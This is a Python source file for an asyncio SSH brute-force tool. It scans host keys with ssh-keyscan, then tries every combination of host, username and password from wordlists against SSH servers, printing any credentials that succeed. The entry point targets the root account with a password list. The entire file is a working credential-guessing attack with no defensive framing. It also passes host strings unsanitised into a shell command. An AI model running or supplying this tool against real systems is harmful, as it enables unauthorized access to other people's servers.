import subprocess
import itertools
import asyncssh
import asyncio
import logging

from pathlib import Path

log = logging.basicConfig(format='ssh_auth 🠖 %(message)s', level=logging.WARNING)


class SShutTFU:
    def __init__(self, host_file, user_file, pass_file, workers):
        self.host_file = self._return_list(host_file)
        self.user_file = self._return_list(user_file)
        self.pass_file = self._return_list(pass_file)
        self.workers = int(workers)
        self.known_hosts = "/home/notroot/.ssh/known_hosts"

    @staticmethod
    def _return_list(item):
        stub = []
        config = Path(item)
        if config.is_file():
            for x in open(item):
                stub.append(x.rstrip())
            return stub
        else:
            stub.append(str(item).rstrip())
            return stub

    async def get_keys(self, host_queue):
        while host_queue.empty() is not True:
            host = await host_queue.get()
            port = 22
            if ':' in host:
                host,  port = host.split(':')
            command = "ssh-keyscan -t rsa,dsa,ecdsa -p"
            proc = subprocess.check_call(f"{command} {port} {str(host)} >> {self.known_hosts} 2>/dev/null", shell=True)
            if proc == 0:
                print(f"Key Added for Host: {host}")
            host_queue.task_done()

    async def worker(self, queue):
        while queue.empty() is not True:
            try:
                h, u, p = await queue.get()
                t = 22
                if ':' in h:
                    h, t = h.split(':')
                k = self.known_hosts
                print(f"Attempting {u} {p} on host {h}                                            \r", end='')
                conn = await asyncio.wait_for(asyncssh.connect(h, username=u, port=t, password=p), timeout=10)
                async with conn:
                    print(f"Credentials Found: {h} {u} {p}                                          ")
            except asyncssh.PermissionDenied:
                pass
            except TimeoutError:
                print("Timeout!!!")
            except Exception as e:
                print(e.args[1])
            finally:
                queue.task_done()

    async def main(self):
        host_queue = asyncio.Queue()

        for h in itertools.product(self.host_file):
            if h:
                host_queue.put_nowait(''.join(h))
        key_tasks = []
        for i in range(self.workers):
            key_task = asyncio.create_task(self.get_keys(host_queue))
            key_tasks.append(key_task)
        await host_queue.join()
        for key_task in key_tasks:
            key_task.cancel()

        queue = asyncio.Queue()

        for h, u, p in itertools.product(self.host_file, self.user_file, self.pass_file):
            queue.put_nowait((h, u, p))
        tasks = []
        for i in range(self.workers):
            task = asyncio.create_task(self.worker(queue))
            tasks.append(task)
        await queue.join()
        for task in tasks:
            task.cancel()


if __name__ == '__main__':
    pwner = SShutTFU('/tmp/hosts.txt', 'root', '/tmp/passwords.txt', 10)
    asyncio.run(pwner.main())



'''
ssh-keyscan -H 192.168.1.162 >> ~/.ssh/known_hosts
'''
